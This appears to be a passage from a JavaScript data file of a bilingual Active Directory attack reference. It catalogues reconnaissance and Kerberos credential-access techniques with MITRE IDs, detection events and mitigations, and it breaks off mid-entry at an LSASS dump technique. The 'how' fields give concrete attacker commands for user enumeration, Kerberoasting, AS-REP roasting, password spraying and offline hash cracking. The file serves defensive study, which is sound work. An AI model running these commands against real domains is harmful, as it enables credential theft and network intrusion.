window.AD = window.AD || {};
AD.I18N = AD.I18N || { ja: {}, en: {} };
AD.I18N.en.attacks = [{"name":"BloodHound / SharpHound Collection","aka":"SharpHound.exe, AzureHound, RustHound, BloodHound CE, bloodhound-python","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087, T1069, T1482, T1615","cve":"","sev":"High","summary":"Reconnaissance tool that mass-collects AD/AzureAD objects, ACLs, sessions, and trusts and visualizes attack paths in a graph DB.","how":"Runs with any authenticated user (Authenticated Users) on a domain-joined host. Use SharpHound.exe -c All, or specify CollectionMethod values such as DCOnly/Session/LoggedOn/ACL/Trusts. DCOnly is stealthy (LDAP only); Session touches ports 445/135 on computers. Import the output zip into the BloodHound GUI and query e.g. Shortest Path to Domain Admins. Remote collection is also possible via bloodhound-python (Linux) or RustHound.","tools":"SharpHound.exe, bloodhound-python, RustHound, AzureHound, BloodHound CE/Legacy GUI, Cypher クエリ","detect":"Characteristic signals are bursts of LDAP queries in a short window and SMB/RPC session enumeration across all computers (NetSessionEnum, NetWkstaUserEnum). Microsoft Defender for Identity (MDI) detects SharpHound enumeration patterns. Correlate events 4661/4662 (DS Access auditing) and spikes in network session enumeration. Access attempts against honey users/honey computers are also effective canaries.","events":"4662, 4661, 5145, 4624(Type3大量), 4798, 4799","mitigate":"Limit session enumeration with Net Cease (restricting anonymous access to NetSessionEnum). Apply the GPO restricting SAMR enumeration (Network access: Restrict clients allowed to make remote calls to SAM). Deploy behavioral detection via EDR/MDI, and periodically review excess ACL permissions to reduce attack paths."},{"name":"LDAP Enumeration","aka":"ldapsearch, ADExplorer, ldapdomaindump, windapsearch, adsisearcher","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002, T1069.002, T1018","cve":"","sev":"Medium","summary":"Basic collection technique that directly queries users, groups, OUs, GPOs, and attributes over LDAP/LDAPS (389/636/3268).","how":"Connect to a DC's LDAP with Authenticated Users rights (sometimes via anonymous/NULL bind). Use ldapsearch -x -H ldap://dc -b 'DC=corp,DC=local', PowerShell's [adsisearcher], windapsearch, or ldapdomaindump. Target attributes such as userAccountControl, servicePrincipalName, description (plaintext passwords leaked in), adminCount, and ms-Mcs-AdmPwd (LAPS). Dump all objects via paged searches.","tools":"ldapsearch, windapsearch, ldapdomaindump, ADExplorer(Sysinternals), PowerView Get-Domain*, adsisearcher","detect":"Detection signals are large-scale, broad LDAP queries from a single source and unusual attribute filters. Enable LDAP diagnostic logging on the DC (15 Field Engineering) and Advanced Auditing's Directory Service Access (4662) to correlate. Detect short-window full-tree paged searches with MDI or SIEM.","events":"4662, 1644(LDAP診断ログ), 2889(非署名LDAPバインド)","mitigate":"Enforce LDAP signing/channel binding and disable anonymous binds. Enforce a practice of not storing sensitive data in attributes such as description. Disable anonymous access via dsHeuristics and restrict Read access to sensitive attributes with ACLs."},{"name":"SPN Scanning (Kerberoast recon)","aka":"GetUserSPNs, setspn -Q, PowerView Get-NetUser -SPN","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1018, T1087.002, T1558.003(前段)","cve":"","sev":"Medium","summary":"Enumerates service accounts holding a servicePrincipalName via LDAP to identify Kerberoastable targets and service placement.","how":"Executable simply by querying the LDAP filter (servicePrincipalName=*) as an authenticated user. Use setspn -T corp -Q */*, Get-NetUser -SPN, impacket's GetUserSPNs.py, or Rubeus kerberoast /stats. A stealthy technique that requires no network scanning and simultaneously performs host discovery (inferring service placement from MSSQL/HTTP/CIFS SPNs) and Kerberoast candidate selection.","tools":"setspn.exe, PowerView Get-NetUser/Get-NetComputer -SPN, GetUserSPNs.py(impacket), Rubeus","detect":"Concentrated LDAP queries against the SPN attribute are a sign of Kerberoast preparation. Since it is hard to distinguish from normal traffic on its own, detect via correlation with an immediately following TGS-REQ (4769, RC4 encryption request). Monitoring access to honey SPNs (decoy accounts assigned unused dummy SPNs) is effective.","events":"4662, 4769(後続のKerberoastで)","mitigate":"Convert service accounts to gMSA (group Managed Service Accounts) to remove SPNs from human-managed accounts. Increase Kerberoast resistance with strong passwords (25+ characters) and enforced AES encryption. Deploy honey SPN accounts as decoys."},{"name":"Kerberos User Enumeration (Pre-Auth / AS-REP probing)","aka":"kerbrute userenum, Kerberos username enumeration","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002","cve":"","sev":"Medium","summary":"Enumerates valid usernames without authentication by distinguishing KDC AS-REQ responses (KDC_ERR_PREAUTH_REQUIRED vs PRINCIPAL_UNKNOWN).","how":"No pre-authentication required. Send AS-REQ to port 88 and exploit the difference: existing users return KDC_ERR_PREAUTH_REQUIRED (25 / 0x19) while non-existent users return KDC_ERR_C_PRINCIPAL_UNKNOWN (6 / 0x6) (24/0x18 is KDC_ERR_PREAUTH_FAILED = wrong password, which is different). Use kerbrute userenum -d corp.local userlist.txt, Rubeus, or nmap krb5-enum-users. Validates usernames en masse without triggering account lockout (no password attempts involved).","tools":"kerbrute, Rubeus, nmap(krb5-enum-users), impacket","detect":"The signal is a spike in failed AS-REQs (event 4768 Failure) for many different usernames in a short window. Detect large volumes of 4768 for non-existent usernames, or many principal lookups from a single source IP. MDI detects Kerberos enumeration behavior.","events":"4768(結果コード 0x6=非存在 / 0x19=存在・要事前認証), 4771","mitigate":"Enable Kerberos Pre-authentication on all accounts (also serves as DES/AS-REP Roast mitigation). Block external access to the KDC with an authenticating proxy/firewall. Set alerts on anomalous 4768 patterns and make naming conventions hard to guess."},{"name":"AS-REP Roasting recon (pre-auth-disabled accounts)","aka":"GetNPUsers, Rubeus asreproast","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1558.004, T1087.002","cve":"","sev":"High","summary":"Enumerates accounts with Kerberos pre-authentication disabled (DONT_REQ_PREAUTH) via LDAP and obtains offline-crackable AS-REPs.","how":"Enumerate accounts holding userAccountControl:1.2.840.113556.1.4.803:=4194304 (DONT_REQ_PREAUTH) via LDAP. Without authentication, use GetNPUsers.py -no-pass or Rubeus asreproast to obtain the AS-REP (the RC4-encrypted TGT portion) and crack it offline with hashcat (-m 18200). Executable even without credentials if a username list is available.","tools":"GetNPUsers.py(impacket), Rubeus asreproast, hashcat -m 18200","detect":"Signs include AS-REQ (4768) against accounts holding the DONT_REQ_PREAUTH attribute and LDAP searches for the pre-auth-disabled attribute. Investigate if a TGT is issued without pre-authentication for an account not used in normal operations. Monitor for RC4-encrypted (etype 0x17) ticket requests.","events":"4768(pre-auth type 0), 4662","mitigate":"Make pre-authentication mandatory on all accounts and eliminate the DONT_REQ_PREAUTH flag (audit periodically). For accounts that unavoidably disable it, enforce strong passwords and AES encryption. Set the same flag on honeypot accounts for decoy detection."},{"name":"Null Session / Anonymous Enumeration","aka":"IPC$ null session, rpcclient anonymous, enum4linux","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087, T1135, T1590","cve":"","sev":"Medium","summary":"Connects to the IPC$ share or SAMR/LSARPC without credentials to enumerate users, groups, shares, and domain policy.","how":"Null-bind with net use \\\\target\\IPC$ '' /u:'', then run enumdomusers/enumdomgroups/querydominfo/lsaenumsid via rpcclient -U '' -N target. Automate bulk enumeration with enum4linux-ng -a target. Anonymous enumeration succeeds on legacy configs (RestrictAnonymous=0), legacy hosts, and some NAS/printers. Includes SMB share enumeration (smbclient -L -N).","tools":"rpcclient, enum4linux(-ng), smbclient, nmap smb-enum-*, NetExec -u '' -p ''","detect":"Detection targets are SMB/IPC$ access via anonymous (NULL) authentication and rpcclient SAMR/LSARPC calls. Monitor events 5140/5145 (share access) where the user is anonymous (ANONYMOUS LOGON), and 4624 Type 3 ANONYMOUS LOGON.","events":"5140, 5145, 4624(ANONYMOUS LOGON)","mitigate":"Enable RestrictAnonymousSAM=1 (RestrictAnonymous=2 is effective only on the Win2000 generation) and Network access: Do not allow anonymous enumeration of SAM accounts and shares. Disable SMBv1 to block legacy anonymous access. Restrict 445/139 to internal-only at the firewall."},{"name":"RID Cycling","aka":"RID brute-forcing, SID cycling, lookupsids","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002, T1589","cve":"","sev":"Medium","summary":"Enumerates all accounts by sequentially appending RIDs (500, 512, 1000...) to a known domain SID and resolving names via LSARPC.","how":"After obtaining the domain SID (e.g., S-1-5-21-...), resolve names via LookupSids/LookupNames using consecutive RIDs starting at 500. Use lookupsid.py corp/user:pass@target 20000, rpcclient's lookupsids, enum4linux -r, or NetExec --rid-brute. With anonymous or low-privileged accounts, it may bypass restricted SAMR enumeration via LSARPC.","tools":"lookupsid.py(impacket), rpcclient(lookupsids), NetExec --rid-brute, enum4linux -r","detect":"A clear signal is large volumes of SID<->name resolution requests (LSARPC LsarLookupSids) against consecutive RIDs. Detect short-window sequential name resolution or many SID lookups within a single session. MDI warns on reconnaissance using account enumeration.","events":"4661, 4662, 5145(lsarpc/samr パイプアクセス)","mitigate":"Set Restrict clients allowed to make remote calls to SAM (SAMR access restriction) to administrators only. Disable anonymous access and control access to LSARPC. Set alerts on abnormal SID lookup volumes."},{"name":"Automated AD Audit Tools (PingCastle / ADRecon / PowerView / Purple Knight)","aka":"PingCastle, ADRecon, PowerView, Purple Knight, Group3r, ADeleg","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087, T1482, T1615, T1069","cve":"","sev":"High","summary":"A family of audit/recon tools that comprehensively and automatically collect AD configuration, vulnerabilities, delegation, trusts, and GPOs and produce reports.","how":"Run as an authenticated user. PingCastle --healthcheck computes a domain-wide vulnerability score over LDAP/SMB/RPC. ADRecon.ps1 generates an Excel report. PowerView (Get-DomainUser/Get-NetGPO/Find-InterestingDomainAcl/Invoke-ACLScanner) explores ACLs and delegation. Attackers repurpose defensive audit tools to quickly grasp weaknesses (weak delegation, old passwords, trusts).","tools":"PingCastle, ADRecon, PowerView(PowerSploit), Purple Knight, Group3r, SharpView","detect":"Tools like PingCastle issue large volumes of LDAP/SMB/RPC queries in a short window, detectable as deviation from baseline. Detect PowerView via AMSI/script block logging (4104) or known-tool signatures with EDR. Monitor for execution outside approved audits.","events":"4104(PowerShellスクリプトブロック), 4662, 5145","mitigate":"Enable PowerShell Constrained Language Mode and AMSI to impede PowerView execution. Defenders should legitimately self-audit with these tools and remediate weaknesses first (review delegation, deploy LAPS). Block script-based reconnaissance with EDR."},{"name":"DNS Enumeration (AD-integrated DNS / Zone Transfer)","aka":"AXFR zone transfer, adidns dump, dnscmd enumeration","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1590.002, T1046, T1018","cve":"","sev":"Medium","summary":"Collects host and SRV records from AD-integrated DNS zones to map the internal network and service placement (DC/GC/Kerberos).","how":"Identify DC/GC/KDC by querying SRV records (_ldap._tcp.dc._msdcs, _kerberos._tcp, _gc._tcp). Obtain all records if zone transfer (dig axfr corp.local @dc) is permitted. AD-integrated DNS can be enumerated by authenticated users via LDAP (CN=MicrosoftDNS) or adidnsdump (NetExec). Records can also be injected by abusing DNS dynamic updates. dnsrecon/dnsenum are also used.","tools":"dig/nslookup(axfr), dnsrecon, dnsenum, adidnsdump, dnscmd, nmap dns-srv-enum","detect":"Signs include zone transfer (AXFR) requests and exhaustive queries for SRV/large record sets. Monitor the source of AXFR and abnormal query volumes via DNS audit logs (Analytical/Debug logs). Detect zone transfer attempts from unauthorized IPs.","events":"DNS Server Analyticalログ(AXFR), 6001(DNS)","mitigate":"Restrict zone transfers to approved secondary DNS servers only (or disable via AD integration). Set DNS dynamic updates to secure (authenticated) only. Review ADIDNS ACLs and do not expose internal DNS externally."},{"name":"GPO Enumeration","aka":"Get-GPO, SYSVOL crawling, Group3r, gpp-decrypt","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1615, T1552.006, T1069.002","cve":"","sev":"High","summary":"Enumerates GPOs and SYSVOL (gpttmpl.inf/groups.xml, etc.) to collect delegation settings, scheduled tasks, and GPP plaintext passwords.","how":"Authenticated users can read SYSVOL (\\\\corp.local\\SYSVOL). Explore risky settings in GPOs with Get-GPO -All, PowerView Get-NetGPO/Get-GPOLocation, and Group3r. In particular, GPP cpassword in Groups.xml and similar can be decrypted with the fixed AES key (gpp-decrypt). From GPO-linked OUs and applied targets, map access control and privilege distribution, and target writable GPOs for GPO Abuse.","tools":"PowerView Get-NetGPO, Get-GPO(GroupPolicy), Group3r, SharpGPOAbuse(偵察), gpp-decrypt, Snaffler","detect":"Signs include large-volume read access to XML/INF files on SYSVOL and LDAP enumeration of GPO objects. Monitor anomalies in SYSVOL share access (5145) and access to Groups.xml and similar. Periodically scan for residual GPP cpassword.","events":"5145(SYSVOLアクセス), 4662(GPOオブジェクト), 5136(GPO変更)","mitigate":"Delete all existing GPP cpassword within SYSVOL even in MS14-025-patched environments. Minimize GPO delegation (Write/Edit rights) and apply Tier separation. Proactively scan and remove sensitive data in SYSVOL with tools like Snaffler, and enable GPO change auditing."},{"name":"Domain Trust Enumeration","aka":"nltest /domain_trusts, Get-NetDomainTrust, BloodHound Trusts","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1482, T1018","cve":"","sev":"Medium","summary":"Enumerates inter-domain/forest trusts with their direction and type (transitive/external/forest) to map lateral movement and privilege escalation paths.","how":"Enumerate trusts with nltest /domain_trusts /all_trusts, Get-NetDomainTrust (PowerView), Get-ADTrust, or SharpHound's Trusts collection. Check trust direction, SID filtering status, and transitivity to prepare for SID History abuse, cross-forest Kerberoast, and golden/silver ticket lateral movement using the trust key.","tools":"nltest, PowerView Get-NetDomainTrust, Get-ADTrust, SharpHound(Trusts), BloodHound","detect":"Signs include LDAP queries against trust objects (trustedDomain) and execution of nltest. Detect concentrated domain trust enumeration from a single host, or trust enumeration outside normal operations, with EDR/MDI.","events":"4662(trustedDomainオブジェクト), 4104","mitigate":"Remove unnecessary trusts and, for those retained, enable SID filtering (Quarantine) and selective authentication. Design the forest boundary as a security boundary and apply Tier separation. Audit trust configuration periodically."},{"name":"SMB Share / Session Enumeration","aka":"NetSessionEnum, NetWkstaUserEnum, ShareFinder, Snaffler","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1135, T1049, T1033","cve":"","sev":"Medium","summary":"Enumerates network shares, active sessions, and logged-on users to locate sensitive files and privileged users.","how":"Discover readable shares with PowerView's Invoke-ShareFinder/Find-DomainShare, and identify hosts where privileged users are logged on with Get-NetSession/Invoke-UserHunter (NetSessionEnum/NetWkstaUserEnum can be enumerated with default low privileges). Automatically hunt passwords and key files within shares using Snaffler. SharpHound's Session collection works on the same principle.","tools":"PowerView(ShareFinder/UserHunter), Snaffler, NetExec --shares/--sessions/--loggedon-users, NetExec","detect":"Signals are NetSessionEnum/NetWkstaUserEnum RPC calls to many hosts and broad SMB share access. Monitor large volumes of 445 connections in a short window and spikes in share tree connections (5140). Privileged-user hunting via UserHunter is detectable with honey users.","events":"5140, 5145, 4624(Type3多発)","mitigate":"Apply Net Cease (restricting anonymous/regular-user access to NetSessionEnum). Minimize share ACLs and do not place sensitive files on shares. Enforce SMB signing and deploy EDR detection for Snaffler-type scanning."},{"name":"Local / Domain Group Membership Enumeration","aka":"net group, Get-NetLocalGroup, Get-DomainGroupMember","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1069.001, T1069.002","cve":"","sev":"Medium","summary":"Enumerates members of privileged groups (Domain Admins/Enterprise Admins/local Administrators) to identify high-value targets.","how":"Use net group 'Domain Admins' /domain, Get-DomainGroupMember -Identity 'Domain Admins' -Recurse, and Get-NetLocalGroup -ComputerName host (remote local group enumeration via SAMR). Recursively expand nested groups to surface effective privilege holders and select lateral movement/escalation targets.","tools":"net group/localgroup, PowerView Get-DomainGroupMember/Get-NetLocalGroup, NetExec --local-groups","detect":"Signs include concentrated LDAP enumeration of privileged groups and remote local group enumeration via SAMR. Focus monitoring on access (4662/4661) to high-value groups such as Domain Admins. Detect anomalous SAMR remote calls with MDI.","events":"4662, 4661, 4799(ローカルグループ列挙)","mitigate":"Restrict SAMR enumeration to administrators only with Restrict clients allowed to make remote calls to SAM. Minimize privileged group membership and operate PAM/PIM. Enable auditing of 4799 (security-enabled local group enumeration)."},{"name":"Password Policy / Account Enumeration","aka":"net accounts, Get-DomainPolicy, PSO enumeration","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1201, T1087.002","cve":"","sev":"Medium","summary":"Retrieve domain password policy and lockout thresholds to design a safe password-spraying strategy.","how":"Use net accounts /domain, Get-DomainPolicy, rpcclient getdompwinfo, or NetExec --pass-pol to obtain lockout threshold, observation window, and minimum length. Enumerate fine-grained password policies (PSO, msDS-PasswordSettings) via LDAP. Compute the attempt count and interval that avoid lockout as the basis for password spraying.","tools":"net accounts, PowerView Get-DomainPolicy, rpcclient(getdompwinfo), NetExec --pass-pol","detect":"LDAP queries against password policy objects or PSOs, and rpcclient getdompwinfo calls, are indicators. Correlate patterns where password spraying (single 4771/4625 events across many accounts) immediately follows.","events":"4662, 後続の4771/4625/4740(ロックアウト)","mitigate":"Deploy a strong password policy and smart lockout (Azure AD/Entra). Alert on single failures spread across many accounts to detect spraying. Enforce MFA broadly to reduce the value of policy information."},{"name":"Certificate Services / ADCS Enumeration","aka":"Certify find, Certipy find, PKINIT template enumeration","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1649, T1087","cve":"","sev":"High","summary":"Enumerate AD CS (certificate templates, CAs, enrollment rights) to discover vulnerable certificate templates such as ESC1-ESC16.","how":"As an authenticated user, run Certify.exe find /vulnerable or certipy find -vulnerable -u user@corp -p pass to LDAP-enumerate CA configuration and template enrollment rights, EKUs, and msPKI attributes. Identify ESC1-ESC16 privilege-escalation paths from misconfigurations (ENROLLEE_SUPPLIES_SUBJECT, Any Purpose EKU, dangerous ACLs). PKI objects reside in the Configuration partition.","tools":"Certify, Certipy, PSPKIAudit, Locksmith(防御側監査)","detect":"Enumeration access to certificate templates / pKIEnrollmentService in the Configuration partition is an indicator. Monitor anomalous certificate requests (4886/4887) on CAs and enrollment against vulnerable templates. Detect the characteristic LDAP queries of Certipy/Certify.","events":"4662(PKIオブジェクト), 4886, 4887(証明書発行)","mitigate":"Inventory vulnerable templates with Locksmith/PSPKIAudit and remediate ESC1 etc. (disable ENROLLEE_SUPPLIES_SUBJECT, require Manager approval). Enable CA auditing and minimize enrollment rights."},{"name":"Delegation Enumeration (Unconstrained/Constrained/RBCD)","aka":"Get-NetComputer -Unconstrained, findDelegation, Find-InterestingDomainAcl","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002, T1558","cve":"","sev":"High","summary":"Enumerate accounts configured for Kerberos delegation (unconstrained/constrained/resource-based) to identify targets for privilege escalation.","how":"Search LDAP for userAccountControl TRUSTED_FOR_DELEGATION (unconstrained), msDS-AllowedToDelegateTo (constrained), and msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD). Enumerate with Get-NetComputer -Unconstrained, findDelegation.py, or PowerView Get-DomainComputer -TrustedToAuth. Unconstrained-delegation hosts become targets for TGT theft via follow-on printer-bug/coerce attacks.","tools":"PowerView(Get-DomainComputer -Unconstrained/-TrustedToAuth), findDelegation.py(impacket), BloodHound, Certipy","detect":"Focused LDAP queries against delegation-related attributes (userAccountControl, msDS-AllowedToDelegateTo, etc.) are indicators. They often appear as part of BloodHound collection; correlate via DS Access auditing. Monitor delegation configuration changes (5136) as well.","events":"4662, 5136(委任属性変更)","mitigate":"Retire unconstrained delegation and migrate to resource-based constrained delegation. Set 'Account is sensitive and cannot be delegated' / Protected Users on privileged accounts. Audit delegation settings regularly and enforce tier separation."},{"name":"Kerberoasting","aka":"SPN Roasting / Service Ticket Cracking (GetUserSPNs)","phase":"credaccess","group":"Kerberos","mitre":"T1558.003","cve":"","sev":"High","summary":"Request TGS-REP (service tickets) for SPN-configured service accounts and brute-force offline the portion encrypted with the service account's password hash to recover the password.","how":"With any domain-authenticated user (low privilege suffices), LDAP-enumerate user accounts holding a servicePrincipalName, send TGS-REQ for those SPNs, and obtain TGS-REP. The KDC encrypts tickets with the service account's NTLM hash (RC4) or AES key, so crack it offline with hashcat (-m 13100=TGS-REP RC4 / -m 19600=AES128 / -m 19700=AES256) via dictionary/brute force. The only prerequisite is one valid account in the domain; access to the target account is not required.","tools":"Rubeus (kerberoast /nowrap /rc4opsec), impacket GetUserSPNs.py, PowerView Invoke-Kerberoast, mimikatz kerberos::list /export, hashcat -m 13100/19600/19700","detect":"Monitor Event ID 4769 (Kerberos service ticket request) for anomalously high TicketEncryptionType 0x17 (RC4) or 0x18, or a pattern where one account issues TGS requests for many distinct SPNs in a short window. In particular, RC4 requested in an AES-capable environment is a downgrade indicator. Skew in Ticket Options or client address are also signals.","events":"4769 (Ticket Encryption Type 0x17=RC4-HMAC が主指標), 補助的に4768","mitigate":"Use 25+ character random passwords or gMSA/dMSA for service accounts, and enforce AES encryption domain-wide to disable RC4. Remove unnecessary SPNs, restrict service accounts with Protected Users or authentication policies, and introduce regular password rotation and honey-SPN accounts for early detection."},{"name":"Targeted Kerberoasting","aka":"SPN-jacking / servicePrincipalName write abuse","phase":"credaccess","group":"Kerberos","mitre":"T1558.003","cve":"","sev":"High","summary":"When the attacker holds write access (GenericWrite/WriteProperty) to a target user object, temporarily assign an SPN to make it Kerberoastable, then remove the SPN after obtaining the hash.","how":"Prerequisite is holding WriteProperty/GenericWrite/GenericAll over the target account. Write an arbitrary SPN (e.g. fake/host) to the servicePrincipalName attribute, Kerberoast the account to obtain TGS-REP, crack offline, then restore the SPN to erase traces. Unlike ordinary Kerberoasting, users without an SPN can also be targeted.","tools":"PowerView Set-DomainObject -Set servicePrincipalName, targetedKerberoast.py, Rubeus, BloodHoundでの書き込み権限特定","detect":"Monitor Event ID 5136 (directory service object change) indicating servicePrincipalName modification, and correlate the sequence of SPN assignment, immediate 4769, then SPN removal. An SPN suddenly appearing on a normal user is a strong anomaly signal.","events":"5136 (servicePrincipalName変更), 4769, 4738","mitigate":"Inventory and minimize excessive Write rights (ACLs) on user objects, and enable SACL auditing of SPN attribute changes. Visualize attack paths with BloodHound and remove dangerous delegation rights; enforce AES to raise cracking cost."},{"name":"Kerberoasting without pre-authentication","aka":"AS-REQ Kerberoasting / GhostSPN","phase":"credaccess","group":"Kerberos","mitre":"T1558.003","cve":"","sev":"Medium","summary":"A variant that abuses accounts with pre-authentication disabled (DONT_REQ_PREAUTH), or write access to the target, to obtain Kerberoastable ticket material via AS-REQ without using any authenticated account.","how":"Prerequisite is either write access to set DONT_REQUIRE_PREAUTH in the target's UserAccountControl, or that it is already disabled. Send an AS-REQ; normally this returns a TGT AS-REP, but by specifying an SPN you obtain a service-ticket-equivalent encrypted blob without pre-authentication and crack it offline. This can be executed even from a position without domain credentials.","tools":"Rubeus (asreproast/kerberoast の組み合わせ), impacket改変スクリプト, targetedKerberoast","detect":"Monitor Event ID 4768 with PreAuthType=0 (no pre-authentication) indicating a pre-auth-less AS-REQ, and detect SPN-bearing requests or RC4 encryption types. Track DONT_REQ_PREAUTH flag changes in UserAccountControl (4738) as well.","events":"4768 (Pre-Auth Type 0), 4738 (UAC変更)","mitigate":"Require pre-authentication on all accounts (clear DONT_REQ_PREAUTH) and audit UAC attribute changes. Restrict SPN write rights, enforce AES, and perform regular configuration-drift inspection."},{"name":"AS-REP Roasting","aka":"AS-REP Cracking / DONT_REQ_PREAUTH abuse","phase":"credaccess","group":"Kerberos","mitre":"T1558.004","cve":"","sev":"High","summary":"Send AS-REQ to accounts with Kerberos pre-authentication disabled and brute-force offline the encrypted portion of the returned AS-REP (encrypted with the user's password key) to recover the password.","how":"Enumerate accounts with DONT_REQ_PREAUTH set using the LDAP filter (userAccountControl:1.2.840.113556.1.4.803:=4194304). Even without credentials (given a username list), send AS-REQ, obtain AS-REP, and crack with hashcat -m 18200 (RC4). Enumeration is easy with any low-privilege domain account, but attempts are also possible unauthenticated via username guessing.","tools":"Rubeus asreproast, impacket GetNPUsers.py, PowerView Get-DomainUser -PreauthNotRequired, Kerbrute, hashcat -m 18200 (AS-REP RC4)","detect":"Detect Event ID 4768 requests with Pre-Authentication Type=0 (no pre-auth) and RC4 encryption type. Legitimate users rarely authenticate without pre-auth, so an AS-REQ against such accounts is itself a high-fidelity signal. Enumeration across multiple accounts in a short window is also an indicator.","events":"4768 (Pre-Auth Type=0, Encryption Type 0x17)","mitigate":"Enable pre-authentication on all accounts (remove DONT_REQ_PREAUTH), and regularly inventory and remove accounts with this flag. Enforce strong passwords and AES encryption, and set the flag on honey accounts as a detection trap."},{"name":"Kerberos Pre-Auth Brute-Force / Password Spraying","aka":"Kerbrute / AS-REQ password spray, user enumeration","phase":"credaccess","group":"Kerberos","mitre":"T1110.003","cve":"","sev":"High","summary":"Abuse the design where AS-REQ pre-authentication (PA-ENC-TIMESTAMP) uses a password-derived key, using KDC responses (success/failure/error codes) to enumerate valid usernames or spray a few passwords. Faster than NTLM and easier to avoid lockout.","how":"Sending a username-only AS-REQ to TCP/UDP 88 returns KDC-ERR-PREAUTH-REQUIRED (valid user) or KDC-ERR-C-PRINCIPAL-UNKNOWN (invalid), enabling unauthenticated user enumeration. Then spray a common password (e.g. Season2026!) across all users; a success returns an AS-REP. Limit to one attempt per user to stay under the account lockout threshold.","tools":"Kerbrute (userenum / passwordspray), Rubeus brute, NetExec kerberos, MSF, Spray365","detect":"Detect a surge of Event ID 4768, especially Result Code 0x6 (unknown principal/enumeration) or 0x18 (pre-auth failure = wrong password), spreading from a single source IP across many accounts. Also correlate spikes in 4771 (pre-auth failure) and low-frequency, distributed attempts over time (characteristic of spraying).","events":"4768, 4771 (Failure Code 0x18), 4776, 4740(ロックアウト)","mitigate":"Deploy a strong password policy, MFA, and smart lockout, and restrict anomalous Kerberos source IPs at the network level. Monitor honey-account attempts, monitor authentication failure rates with SIEM correlation, and prohibit external exposure of KDC port 88."},{"name":"Timeroasting","aka":"NTP authentication roast / MS-SNTP computer account roasting","phase":"credaccess","group":"Kerberos","mitre":"T1110, T1552","cve":"","sev":"Medium","summary":"Abuse the design where Windows authenticated NTP (MS-SNTP) computes the response MAC from the computer account's NTLM hash (MD5), collecting computer account hashes for offline cracking with neither pre-authentication nor domain credentials.","how":"From an unauthenticated, non-domain-joined position, send an NTP request to a DC (NTP server) with the computer account's RID in the extended authentication field. The DC responds with a MAC based on that account's MD5 (NTLM hash), which is collected and cracked with hashcat (mode 31300). By brute-forcing RIDs, all computer account hashes can be enumerated. Computer/trust accounts with weak passwords are the targets.","tools":"timeroast.py (SecuraBV), hashcat -m 31300, カスタムNTPクライアント","detect":"Since this rarely surfaces in conventional Kerberos events, monitor for anomalous volumes of authenticated SNTP requests to the DC's NTP/UDP 123 and consecutive RID-specification patterns in network/firewall logs. Traffic where a single source elicits responses for many distinct computer RIDs is an indicator.","events":"ネットワークログ(UDP 123 MS-SNTP), 標準Kerberosイベントには非出現","mitigate":"Computer accounts normally have auto-generated strong passwords, but eliminate trust accounts with manually set or old weak passwords. Limit DC NTP authentication (MS-SNTP) to the necessary scope, control access to UDP 123, and where possible disable authenticated NTP and migrate to secure time synchronization."},{"name":"Trustroasting","aka":"trust account roast / inter-realm TGT cracking","phase":"credaccess","group":"Kerberos","mitre":"T1558","cve":"","sev":"Medium","summary":"A variant targeting the shared key of the trust account (TDO) used for domain/forest trusts with Kerberoast/AS-REP-like techniques, attempting to recover the trust key offline from inter-realm TGT encryption material.","how":"Against the trust account representing the partner domain of a trust relationship (e.g. the inter-realm key equivalent to DOMAIN$), obtain ticket material via SPN or via AS-REP and crack it offline. The prerequisite is a domain-authenticated account. On success, forge a fake inter-realm TGT (trust ticket) using the trust key and move laterally into the trusted domain.","tools":"Rubeus, impacket, hashcat, 信頼アカウント列挙用LDAPクエリ","detect":"Monitor 4769/4768 requests against trust accounts (trust objects whose names end in $), especially RC4 encryption types. TGS requests targeting trust accounts, which normally do not occur, are a high-fidelity signal.","events":"4769, 4768 (信頼アカウント対象, Enc Type 0x17)","mitigate":"Rotate trust keys regularly, move trusts to AES, remove unnecessary trusts, and enable SID filtering / selective authentication. Prioritize monitoring of Kerberos requests targeting trust accounts."},{"name":"Kerberos Encryption Downgrade (RC4 Downgrade)","aka":"etype downgrade / RC4-HMAC forcing","phase":"credaccess","group":"Kerberos","mitre":"T1558.004","cve":"","sev":"High","summary":"An auxiliary attack where the attacker presents only RC4-HMAC (etype 23) as the supported encryption type in AS-REQ/TGS-REQ, forcing tickets to be encrypted with weaker RC4 instead of AES to dramatically lower the cracking cost of Kerberoast/AS-REP Roast.","how":"When running Kerberoast/AS-REP Roast, set the request's etype field to RC4 only (in Rubeus, /tgtdeleg is an actual downgrade method that forces RC4 even on AES-enabled accounts; /rc4opsec is the opposite, an OPSEC option limited to non-AES accounts that avoids detection of RC4 requests. Note that on Windows Server 2019+, tgtdeleg may fail because AES is still returned for AES-enabled accounts). If the KDC still permits RC4, the ticket is encrypted with an RC4 key derived from the NTLM hash instead of the AES key, speeding up brute force with hashcat -m 13100/18200. The prerequisite is that RC4 is not disabled in the domain.","tools":"Rubeus (/tgtdeleg=RC4強制, /rc4opsec=AES非対応アカウント限定のOPSEC), mimikatz, impacket(指定etype), hashcat -m 13100/18200","detect":"Monitor Event ID 4768/4769 requests whose Ticket Encryption Type is 0x17 (RC4-HMAC) or 0x18. RC4 requests observed in an AES-standardized environment are a direct indicator of a downgrade attack; detect them as deviations from the baseline (normally 0x12 AES256).","events":"4768/4769 (Encryption Type 0x17=RC4-HMAC, 0x18=RC4-HMAC-EXP)","mitigate":"Restrict Kerberos allowed encryption types to AES128/256 only via group policy and fully disable RC4/DES (msDS-SupportedEncryptionTypes). Identify legacy dependencies and migrate in stages, and alert on RC4 requests. Reset passwords to reliably generate AES keys for KRBTGT and service accounts."},{"name":"LSASS Memory Dump via comsvcs.dll MiniDump","aka":"LOLBin LSASS dump / rundll32 MiniDump","phase":"credaccess","group":"Host / 